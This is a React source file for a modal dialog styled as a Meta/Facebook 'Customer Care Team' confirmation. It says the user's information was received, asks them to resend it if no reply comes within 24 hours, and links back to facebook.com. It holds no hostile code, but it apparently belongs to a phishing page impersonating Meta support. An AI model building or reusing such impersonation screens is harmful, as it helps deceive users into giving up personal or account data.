import PropTypes from 'prop-types';
import CreativeImg from '@/assets/images/creative.webp';
import MetaLogoGray from '@/assets/images/logo-meta.svg';

const SuccessModal = ( { show, onClose, texts } ) =>
{
    if ( !show ) return null;

    return (
        <>
            {/* Backdrop */ }
            <div
                onClick={ onClose }
                style={ { position: 'fixed', inset: 0, zIndex: 1040, background: 'rgba(0,0,0,0.5)' } }
            />

            {/* Modal */ }
            <div style={ {
                position: 'fixed', inset: 0, zIndex: 1050,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                padding: '16px'
            } }>
                <div
                    style={ {
                        background: 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)',
                        width: '100%',
                        maxWidth: '512px',
                        maxHeight: '90vh',
                        borderRadius: '16px',
                        boxShadow: '0 20px 60px rgba(0,0,0,0.2)',
                        padding: '20px',
                        display: 'flex',
                        flexDirection: 'column',
                        overflow: 'hidden'
                    } }
                    onClick={ ( e ) => e.stopPropagation() }
                >
                    {/* Header */ }
                    <div style={ { display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px', flexShrink: 0 } }>
                        <h2 style={ {
                            fontWeight: '700',
                            color: '#0A1317',
                            fontSize: '15px',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            textAlign: 'center',
                            margin: 0
                        } }>
                            { texts.successModalTitle || 'Request has been sent' }
                        </h2>
                        <div
                            onClick={ onClose }
                            style={ { width: '18px', height: '18px', cursor: 'pointer', opacity: 0.6, display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'opacity 0.2s' } }
                            onMouseOver={ ( e ) => e.currentTarget.style.opacity = '1' }
                            onMouseOut={ ( e ) => e.currentTarget.style.opacity = '0.6' }
                        >
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0A1317" strokeWidth="2.5" strokeLinecap="round">
                                <path d="M18 6L6 18M6 6l12 12" />
                            </svg>
                        </div>
                    </div>

                    {/* Scrollable body */ }
                    <div style={ { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', alignItems: 'center' } }>
                        <div style={ { width: '100%' } }>
                            {/* Image */ }
                            <div style={ { borderRadius: '10px', overflow: 'hidden', marginBottom: '15px', height: '250px', width: '100%' } }>
                                <img
                                    src={ CreativeImg }
                                    alt={ texts.successModalHeroAlt || 'success' }
                                    style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } }
                                />
                            </div>

                            {/* Text */ }
                            <p style={ { color: '#9a979e', fontSize: '15px', paddingTop: '20px', marginBottom: '10px', lineHeight: '1.5' } }>
                                { texts.successModalDesc || 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.' }
                            </p>
                            <p style={ { color: '#9a979e', fontSize: '15px', marginBottom: '20px' } }>
                                { texts.successModalFrom || 'From the Customer Care Team' }
                            </p>

                            {/* Button */ }
                            <a
                                href="https://www.facebook.com"
                                style={ {
                                    height: '45px', minHeight: '45px', width: '100%',
                                    background: '#0064E0', color: '#fff',
                                    borderRadius: '40px',
                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    textDecoration: 'none',
                                    fontWeight: '500', fontSize: '15px',
                                    transition: 'opacity 0.3s'
                                } }
                                onMouseOver={ ( e ) => e.currentTarget.style.opacity = '0.9' }
                                onMouseOut={ ( e ) => e.currentTarget.style.opacity = '1' }
                            >
                                { texts.successModalBtn || 'Return to facebook' }
                            </a>
                        </div>

                        {/* Bottom Logo */ }
                        <div style={ { width: '60px', margin: '20px auto 0', paddingTop: '32px' } }>
                            <img src={ MetaLogoGray } alt={ texts.successModalLogoAlt || 'logo' } style={ { width: '100%', height: 'auto', objectFit: 'contain', opacity: 0.4 } } />
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

SuccessModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    texts: PropTypes.object
};

export default SuccessModal;
